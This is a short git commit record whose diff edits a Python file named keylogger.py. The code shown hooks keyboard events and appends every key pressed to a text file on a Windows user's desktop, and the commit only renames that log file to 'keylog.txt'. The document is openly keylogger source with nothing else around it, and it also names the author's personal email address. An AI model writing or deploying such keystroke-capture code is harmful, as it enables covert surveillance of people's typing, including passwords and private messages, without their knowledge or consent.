c7678973e3081930c6fbbc35472e34edf4913b6b
Dv-AlejandroEH <aespher121@gmail.com>
2025-01-27 10:12:57 +0100

    code finished

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,7 @@
 import keyboard
 
 def on_key_event(event):
-    f = open('C:\\Users\\PC03\\Desktop\\entradas.txt', 'a')
+    f = open('C:\\Users\\PC03\\Desktop\\keylog.txt', 'a')
     if event.name == 'space':
         f.write(' ')
     f.write(str(event.name))
